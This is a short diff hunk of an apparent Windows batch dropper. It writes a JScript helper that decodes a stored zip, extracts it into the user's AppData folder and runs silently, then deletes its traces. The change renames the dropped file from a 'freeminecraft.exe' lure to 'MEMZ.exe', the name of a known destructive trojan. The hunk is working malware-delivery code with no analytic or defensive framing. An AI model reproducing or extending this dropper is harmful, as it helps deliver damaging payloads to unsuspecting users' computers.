@@ -160,7 +160,7 @@ echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();
 echo z=f.getAbsolutePathName(^"z.zip^");o.saveToFile(z);s=new ActiveXObject(^"Shell.Application^");>>x.js
 echo s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();>>x.js
 
-set v="%appdata%\freeminecraft.exe"
+set v="%appdata%\MEMZ.exe"
 del %v% >NUL 2>NUL
 cscript x.js >NUL 2>NUL
 del x.js >NUL 2>NUL
